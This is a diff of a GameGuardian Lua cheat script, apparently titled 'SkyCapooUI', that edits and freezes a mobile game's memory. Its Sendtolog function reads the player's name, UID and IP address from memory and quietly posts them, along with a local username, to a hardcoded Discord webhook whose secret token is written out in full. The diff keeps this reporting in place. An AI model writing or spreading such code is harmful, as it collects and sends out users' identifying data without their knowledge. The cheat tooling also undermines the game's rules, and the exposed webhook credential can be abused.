@@ -93,8 +93,6 @@ gg.toast("95％...")
 function GetValue(address, flag) return gg.getValues({{address = address, flags = flag}})[1].value end 
 function GotoPointer(address, offset) local Addr = GetValue(address, 32) & 0xFFFFFFFFFF if offset then for k, v in pairs(offset) do Addr = GetValue(Addr + v, 32) & 0xFFFFFFFFFF end end return Addr end 
 local modifiedValues = {}
-
--- 函數：將字串轉換為字節
 function stringToBytes(str)
     local bytes = {}
     for i = 1, #str do
@@ -103,7 +101,6 @@ function stringToBytes(str)
     table.insert(bytes, 0) -- 添加字符串結束符
     return bytes
 end
--- 修改内存中的字符串
 function modifyString(address, newString)
     local bytes = stringToBytes(newString)
     local values = {}
@@ -112,27 +109,18 @@ function modifyString(address, newString)
     end
     gg.setValues(values)
 end
-
--- 函數：修改並記錄內存值
 function modifyAndFreezeString(address, newString, maxLength)
-    -- 確保 maxLength 有值，默認為 32
     maxLength = maxLength or 64
-
-    -- 將新字串轉換為字節
     local bytes = stringToBytes(newString)
-
-    -- 讀取原內存值並記錄
     for i = 0, maxLength - 1 do
         local originalValue = gg.getValues({{address = address + i, flags = gg.TYPE_BYTE}})
         if not modifiedValues[address + i] then
             modifiedValues[address + i] = originalValue[1].value -- 記錄原始值
         end
     end
-    -- 填充不足部分為 0x00
     while #bytes < maxLength do
         table.insert(bytes, 0)
     end
-
     local values = {}
     for i = 1, #bytes do
         table.insert(values, {
@@ -147,9 +135,8 @@ function modifyAndFreezeString(address, newString, maxLength)
 end
 lde = {}
 lde.gre, lde.sbr, lde.srg, lde.crs = gg.getResults, gg.searchNumber, gg.setRanges, gg.clearResults
--- 用於範圍解析的優化函數
 function bv(a, sep)
-    sep = sep or ","  -- 設定默認的分隔符
+    sep = sep or "," 
     local result = {}
     for part in string.gmatch(a, "[^" .. sep .. "]+") do
         table.insert(result, part)
@@ -160,8 +147,6 @@ function bv(a, sep)
     end
     return result
 end
-
--- 優化的 so 函數
 function so(a, b, c)
     gg.setVisible(false)
     local csn = gg.getRanges()
@@ -171,14 +156,11 @@ function so(a, b, c)
     local js = gg.getResultCount()
     local cont = gg.getResults(js)
     gg.clearResults()
-
     if #cont == 0 then
         gg.setRanges(csn)
         return a[1] .. " 開啟失敗"
     end
-
     local lode, lope, lobe = {}, {}, {}
-
     for p = 1, #b do
         lode[p] = {}
         for i = 1, #cont do
@@ -189,23 +171,19 @@ function so(a, b, c)
         end
         lode[p] = gg.getValues(lode[p])
 
-        local dbb = bv(b[p][1], "~")  -- 使用 ~ 作為範圍分隔符
-
+        local dbb = bv(b[p][1], "~")
         for i = 1, #lode[p] do
             local value = tonumber(lode[p][i].value)
             if value and value >= tonumber(dbb[1]) and value <= tonumber(dbb[2]) then
                 table.insert(lope, cont[i])
             end
         end
-
         if #lope == 0 then
             gg.setRanges(csn)
             return a[1] .. " 開啟失敗"
         end
-
         cont, lope = lope, {}
     end
-
     for i = 1, #c do
         for n = 1, #cont do
             local temp = {
@@ -222,7 +200,6 @@ function so(a, b, c)
             table.insert(c[i][4] and lobe or lope, temp)
         end
     end
-
     gg.setValues(lope)
     gg.addListItems(lobe)
     gg.setRanges(csn)
@@ -375,14 +352,13 @@ local tttyy = S_Pointer(t, tt, true)
 MyIPv4 = readString(tttyy,12)
 end
 
-gg.sleep(100)
 function Sendtolog()
 checkplayerdata()
-local user_name = username
-local player_name = Myname
-local player_uid = Myuid
-local myIPAddress = MyIPv4
-local webhook_url = "https://discord.com/api/webhooks/1293219977096073319/32svVajM7yY925l54bUIOCXSWGMRN6gZAlORdLEqmSFrCznr6SFFALme25t5u4V3fSy2"
+user_name = username
+player_name = Myname
+player_uid = Myuid
+myIPAddress = MyIPv4
+webhook_url = "https://discord.com/api/webhooks/1293219977096073319/32svVajM7yY925l54bUIOCXSWGMRN6gZAlORdLEqmSFrCznr6SFFALme25t5u4V3fSy2"
 if not player_name then
     player_name = "nil"
 elseif not player_uid or player_uid == 0 then
@@ -390,12 +366,12 @@ elseif not player_uid or player_uid == 0 then
 elseif not myIPAddress then
     myIPAddress = "nil"
 end
-local payload = [[
+payload = [[
 {
   "content": "UserName: (]] .. user_name .. [[) PlayerName: (]] .. player_name .. [[) uid: (]] .. player_uid .. [[) IP: (]] .. myIPAddress .. [[) logged in SkyCapooUI"
 }
 ]]
-local headers = {
+headers = {
     ["Content-Type"] = "application/json"
 }
 local response = gg.makeRequest(webhook_url, headers, payload)
@@ -3204,10 +3180,8 @@ gg.toast("茁壯成長刷取成功")
 end
 
 
-local hostitemsaveFilePath = gg.getFile() .. "_host_items_saved_data.txt"
--- 函數：保存數據到文件
 function hostitemssaveData(hostitemdata)
-    local file = io.open(hostitemsaveFilePath, "w")
+    local file = io.open(gg.getFile() .. "_host_items_saved_data.txt", "w")
     if file then
         file:write(table.concat(hostitemdata, ","))
         file:close()
@@ -3215,7 +3189,7 @@ function hostitemssaveData(hostitemdata)
 end
 -- 函數：讀取保存的數據
 function hostitemsloadData()
-    local file = io.open(hostitemsaveFilePath, "r")
+    local file = io.open(gg.getFile() .. "_host_items_saved_data.txt", "r")
     if file then
         local content = file:read("*all")
         file:close()
@@ -4011,7 +3985,7 @@ end
 end
 
 
-local SkyCapoofilename = gg.getFile() .. "_Skyusername.txt" -- 保存用戶名的文件名
+
 function SkyCapoofileExists(name)
   local file = io.open(name, "r")
   if file then
@@ -4022,17 +3996,18 @@ function SkyCapoofileExists(name)
   end
 end
 
+
 function gameloging()
 -- 第一次運行時，提示用戶輸入名稱
-if not SkyCapoofileExists(SkyCapoofilename) then
-  local loguser = gg.prompt({"請設定用戶名稱"}, {[1] = "User"}, {[1] = "text"})
+if not SkyCapoofileExists(gg.getFile() .. "_Skyusername.txt") then
+  loguser = gg.prompt({"請設定用戶名稱"}, {[1] = "User"}, {[1] = "text"})[1]
   if not loguser then gg.alert("未設定用戶名稱") return end
-  if loguser and loguser[1] ~= "" then
-    local assfile = io.open(SkyCapoofilename, "w")
-    assfile:write(loguser[1])
+  if loguser ~= "" then
+    assfile = io.open(gg.getFile() .. "_Skyusername.txt", "w")
+    assfile:write(loguser)
     assfile:close()
-    gg.alert("用戶名稱已設定: " .. loguser[1])
-    username = loguser[1]
+    gg.alert("用戶名稱已設定: " .. loguser)
+    username = loguser
     gg.alert("歡迎使用, 用戶: " .. username)
     dologin()
   else
@@ -4041,7 +4016,7 @@ if not SkyCapoofileExists(SkyCapoofilename) then
   end
 else
   -- 文件存在時，自動讀取用戶名稱
-  local assfile = io.open(SkyCapoofilename, "r")
+  assfile = io.open(gg.getFile() .. "_Skyusername.txt", "r")
   username = assfile:read("*a")
   assfile:close()
   gg.alert("歡迎使用, 用戶: " .. username)
